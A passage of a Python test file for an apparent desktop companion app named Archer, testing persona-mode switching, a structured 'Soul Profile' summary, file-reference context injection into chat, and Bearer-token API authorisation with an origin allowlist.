        from terminal.api import _routes as routes

        config_path = tmp_path / "archer.toml"
        config_path.write_text('[persona]\ndefault_mode = "listener"\n', encoding="utf-8")
        cfg = {"persona": {"default_mode": "listener", "modes": {}}}
        monkeypatch.setattr(routes, "CONFIG_PATH", config_path)
        monkeypatch.setattr(routes, "_load_config", lambda: cfg)

        try:
            routes.payload_post("/modes/current", {"mode": "missing"})
        except ValueError as exc:
            assert "unknown mode" in str(exc)
        else:
            raise AssertionError("unknown mode should fail")


class TestDesktopSoulProfile:
    """测试桌面端 Soul Profile 结构化摘要。"""

    def test_soul_profile_route_returns_profile_sections_and_growth_markers(self, tmp_path, monkeypatch):
        from terminal.api import _routes as routes
        import memory.store as store

        profile_path = tmp_path / "SOUL_PROFILE.json"
        profile_path.write_text(
            """
            {
              "core_values": ["自己能做的事情尽量自己做好"],
              "emotional_patterns": ["焦虑时会用规划填充不确定"],
              "life_themes": ["从失去旧记忆到重建新系统"],
              "creative_identity": ["把复杂体验写成清楚的东西"],
              "current_life_stage": ["Archer 进入灵魂伴生体阶段"]
            }
            """.strip(),
            encoding="utf-8",
        )
        monkeypatch.setattr(store, "DB_PATH", tmp_path / "memory.db")
        store.init_db()
        store.save("开始把阶段变化记录为成长标记", type="growth_marker", importance=5)
        monkeypatch.setattr(
            routes,
            "_load_config",
            lambda: {"persona": {"soul_profile_path": str(profile_path)}},
        )

        status, payload = routes.payload_get("/soul-profile")

        assert status == 200
        sections = {section["id"]: section for section in payload["sections"]}
        assert sections["core_values"]["items"] == ["自己能做的事情尽量自己做好"]
        assert sections["emotional_patterns"]["items"] == ["焦虑时会用规划填充不确定"]
        assert sections["life_themes"]["items"] == ["从失去旧记忆到重建新系统"]
        assert sections["creative_identity"]["items"] == ["把复杂体验写成清楚的东西"]
        assert sections["current_life_stage"]["items"] == ["Archer 进入灵魂伴生体阶段"]
        assert sections["growth_markers"]["items"] == ["开始把阶段变化记录为成长标记"]


class TestFileReferences:
    """测试聊天流文件引用上下文。"""

    def test_clean_file_refs_normalizes_payload(self):
        refs = _clean_file_refs([{"path": "/tmp/a.md", "name": "a.md", "size": "12"}])
        assert refs == [{"path": "/tmp/a.md", "name": "a.md", "size": 12}]

    def test_file_reference_context_injects_text(self, tmp_path):
        note = tmp_path / "note.md"
        note.write_text("# Note\nhello", encoding="utf-8")

        context, events = _file_reference_context([{"path": str(note), "name": "note.md", "size": note.stat().st_size}])
        assert "hello" in context
        assert any(event["toolEvent"]["status"] == "complete" for event in events)

    def test_file_reference_context_skips_non_text(self, tmp_path):
        image = tmp_path / "image.png"
        image.write_bytes(b"\x89PNG")

        context, events = _file_reference_context([{"path": str(image), "name": "image.png", "size": 4}])
        assert context == ""
        assert any(event["toolEvent"]["status"] == "blocked" for event in events)

    def test_chat_stream_with_file_refs_yields_tool_event(self, tmp_path, monkeypatch):
        note = tmp_path / "note.txt"
        note.write_text("local context", encoding="utf-8")
        monkeypatch.setattr("core.llm.stream_chat", lambda messages, **kwargs: iter(["ok"]))

        events = list(_iter_chat_chunks(
            [{"role": "user", "content": "use file"}],
            memory_mode="off",
            obsidian_mode="off",
            file_refs=[{"path": str(note), "name": "note.txt", "size": note.stat().st_size}],
        ))
        assert any(event.get("toolEvent", {}).get("name") == "file.reference" for event in events)
        assert any(event.get("type") == "token" and event.get("text") == "ok" for event in events)


class TestDesktopApiAuth:
    """测试桌面 API Bearer token 鉴权。"""

    def _handler(self, token: str, path: str, auth_header: str = "", origin: str = ""):
        archer_api.DESKTOP_API_TOKEN = token
        handler = object.__new__(Handler)
        handler.path = path
        handler.headers = {
            "Authorization": auth_header,
            "Origin": origin,
        }
        return handler

    def test_health_does_not_require_token(self):
        handler = self._handler("secret", "/health")
        assert handler._authorized() is True
        archer_api.DESKTOP_API_TOKEN = ""

    def test_status_requires_token(self):
        handler = self._handler("secret", "/status")
        assert handler._authorized() is False
        archer_api.DESKTOP_API_TOKEN = ""

    def test_wrong_token_cannot_save_settings(self):
        handler = self._handler("secret", "/settings/save", "Bearer wrong")
        assert handler._authorized() is False
        archer_api.DESKTOP_API_TOKEN = ""

    def test_correct_token_can_validate_settings(self):
        handler = self._handler("secret", "/settings/validate", "Bearer secret")
        assert handler._authorized() is True
        archer_api.DESKTOP_API_TOKEN = ""

    def test_origin_allowlist_includes_dev_and_packaged_file_origin(self):
        dev = self._handler("secret", "/status", "Bearer secret", "http://localhost:5173")
        packaged = self._handler("secret", "/status", "Bearer secret", "null")
        assert dev._allow_origin() == "http://localhost:5173"
        assert packaged._allow_origin() == "null"
        archer_api.DESKTOP_API_TOKEN = ""


if __name__ == "__main__":
    import pytest
    pytest.main([__file__, "-v"])
